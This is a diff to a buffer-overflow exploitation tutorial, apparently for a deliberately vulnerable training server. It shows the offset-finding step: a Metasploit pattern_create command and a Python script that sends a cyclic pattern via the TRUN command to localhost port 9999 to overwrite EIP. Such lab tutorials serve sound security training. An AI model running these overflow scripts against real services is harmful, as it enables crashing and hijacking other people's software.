@@ -121,19 +121,17 @@ Write down the number of bytes it took to crash the program.
 ## Finding the Offset
 The correct identification of the offset will help ensure that the Shellcode you generate will not immediately crash the program.
 
-Generate pattern code, replacing the number in the command with the number of bytes it took to crash the program.
+1. Generate pattern code, replacing the number in the command with the number of bytes it took to crash the program.
 ```console
 /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000
 ```
 
-Copy the output of the pattern_create command and edit the offset.py script provided in this repository. Replace the existing offset value portion of the script with the pattern that you generated from the command. Replace the IP, Port, and Command as you did in the previous testing sections.
+2. Copy the output of the pattern_create command and edit the offset.py script provided in this repository. Replace the existing offset value portion of the script with the pattern that you generated from the command. Replace the IP, Port, and Command as you did in the previous testing sections.
 Closeout Immunity + the executable program.
-Repeat the process of relaunching Immunity and attaching to the executable program.
+3. Repeat the process of relaunching Immunity and attaching to the executable program.
 Run the script
 ```python
-  
 #!/usr/bin/python
-from __future__ import print_function
 import sys, socket
 
 offset = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9"
@@ -141,10 +139,13 @@ offset = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2A
 try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(('127.0.0.1',9999))
-       s.send(('strcpy /.:/' + offset))
+       s.recv(1024)
+       s.send(('TRUN /.:/' + offset + '\r\n').encode())
        s.close()
+       print("[+] Poc sent")
 
-except:
+except Exception as e:
+       print(e)
        print("Error connecting to server")
        sys.exit()
 ```
@@ -153,7 +154,7 @@ except:
 python offset.py
 ```
 
-Go into Immunity and look for a number written in the EIP space.
+4. Go into Immunity and look for a number written in the EIP space.
 IMAGE HERE 
 
 If there is no number written into the EIP space, the number of bytes you identified in your Fuzz may be off. Go back to step 1 and regenerate pattern code, using a number higher than whatever you had written to the script. For instance, if you used 700, try 1000, or 1200. If you are unsuccessful, you may have messed up during Fuzzing. Go back to the Fuzzing section and try to stop the script faster when you see the Access Violation in Immunity.
